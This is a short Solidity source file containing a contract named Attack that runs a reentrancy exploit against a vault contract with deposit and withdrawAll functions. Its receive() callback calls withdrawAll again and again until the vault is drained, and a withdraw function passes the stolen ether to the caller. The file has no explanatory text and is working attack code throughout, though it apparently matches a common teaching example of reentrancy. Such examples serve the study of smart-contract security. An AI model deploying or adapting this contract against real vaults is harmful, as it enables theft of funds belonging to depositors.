// SPDX-License-Identifier: MIT

pragma solidity 0.8.13;

interface IEtherVault {
function deposit() external payable;
function withdrawAll() external;
}

contract Attack {
IEtherVault public immutable etherVault;

constructor(IEtherVault _etherVault) {
    etherVault = _etherVault;
}

receive() external payable {
    if (address(etherVault).balance >= 1 ether) {
        etherVault.withdrawAll();
    }
}

function attack() external payable {
    require(msg.value == 1 ether, "Require 1 Ether to attack");
    etherVault.deposit{value: 1 ether}();
    etherVault.withdrawAll();
}

function getBalance() public view returns (uint256) {
    return address(this).balance;
}
function withdraw() public {
    uint256 balance = getBalance();
    payable(msg.sender).transfer(balance);
}
}

